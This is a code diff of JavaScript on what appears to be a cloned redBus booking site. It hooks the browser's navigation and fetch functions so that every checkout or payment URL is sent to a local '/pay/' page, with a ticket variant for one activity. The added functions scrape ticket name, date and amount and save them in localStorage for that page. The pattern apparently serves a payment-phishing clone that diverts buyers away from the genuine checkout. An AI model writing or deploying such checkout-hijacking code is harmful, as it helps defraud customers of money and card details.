@@ -73,8 +73,14 @@ fbq('track', 'PageView');
         });
 
     }
+    
+    if (location.pathname.indexOf('/activities/details/517') !== -1) {
+  location.href = '/pay/?ticket';
+}else{
+  location.href = '/pay/';
+}
 
-    location.href = '/pay/';
+    
 }
 
   var _fetch = window.fetch;
@@ -111,6 +117,7 @@ fbq('track', 'PageView');
   function checkPayUrl(url) {
   if (typeof url === 'string') {
     var p = url.split('?')[0];
+    var ur;
     console.log('[checkPayUrl]', p); // ← 加這行
     if (
       p.indexOf('/paymentDetails') !== -1 ||
@@ -120,7 +127,12 @@ fbq('track', 'PageView');
       /\/checkout(\?|$)/.test(p)
     ) {
       redirectPay();
-      return '/pay/';
+    if (location.pathname.indexOf('/activities/details/517') !== -1) {
+  return '/pay/?ticket';
+}else{
+  return '/pay/';
+}
+
     }
   }
   return url;
@@ -131,6 +143,61 @@ fbq('track', 'PageView');
   history.replaceState = function(s, t, u) { u = checkPayUrl(u); return _rs.call(this, s, t, u); };
   try { var _assign = location.assign.bind(location); location.assign = function(u) { return _assign(checkPayUrl(u)); }; } catch(e) {}
   try { var _rep = location.replace.bind(location); location.replace = function(u) { return _rep(checkPayUrl(u)); }; } catch(e) {}
+
+
+  function extractTicketData() {
+
+  var data = {};
+
+  data.productType = 'Ticket';
+
+  try {
+
+    var nameEl = document.querySelector(
+      "[class^='ticketName__styles-details-bookingOptions-module-scss-']"
+    );
+
+    var totalEl = document.querySelector(
+      "[class^='totalAmtComputed__styles-details-bookingOptions-module-scss-']"
+    );
+
+    var dateEl = document.querySelector(
+      "[class^='dateTxt__styles-details-bookingOptions-module-scss-']"
+    );
+
+    if (nameEl) {
+      data.ticketName = nameEl.textContent.trim();
+    }
+
+    if (dateEl) {
+      data.ticketDate = dateEl.textContent.trim();
+    }
+
+    if (totalEl) {
+
+      var txt = totalEl.textContent || '';
+
+      var m = txt.match(/[\d,.]+/);
+
+      if (m) {
+        data.amount = m[0].replace(/,/g, '');
+      }
+
+    }
+
+  } catch(ex) {}
+
+  data.currency = 'MYR';
+
+  console.log('[Ticket Extracted]', data);
+
+  return data;
+}
+
+
+
+
+
 
   function extractBookingData() {
     var data = {};
@@ -255,7 +322,7 @@ fbq('track', 'PageView');
       } else {
         var els = document.querySelectorAll("div.listText___b3f376.undefined");
         data.seats = Array.from(els).map(function(el) {
-          return el.innerText.trim().replace(/[^0-9]/g, '');
+          return el.innerText.trim().replace('Seat', '');
         }).join('\n');
       }
     } catch(ex) {}
@@ -343,6 +410,15 @@ var observer = new MutationObserver(function() {
       btn.addEventListener('click', function() {
         var data = extractBookingData();
         try { localStorage.setItem('redbus_booking', JSON.stringify(data)); } catch(ex) {}
+      });
+    }
+
+    var btns = document.querySelector("body > div.overlayBg__styles-genericOverlay-genericOverlay-module-scss-GP6D7.undefined > div > div.fixedBottomCta__styles-details-bookingOptions-module-scss-YG7co > div.buttonWrap__styles-details-bookingOptions-module-scss-cuyXz > div:nth-child(2)");
+    if (btns && !btns._bound) {
+      btns._bound = true;
+      btns.addEventListener('click', function() {
+        var data = extractTicketData();
+        try { localStorage.setItem('redbus_booking_ticket', JSON.stringify(data)); } catch(ex) {}
       });
     }
 
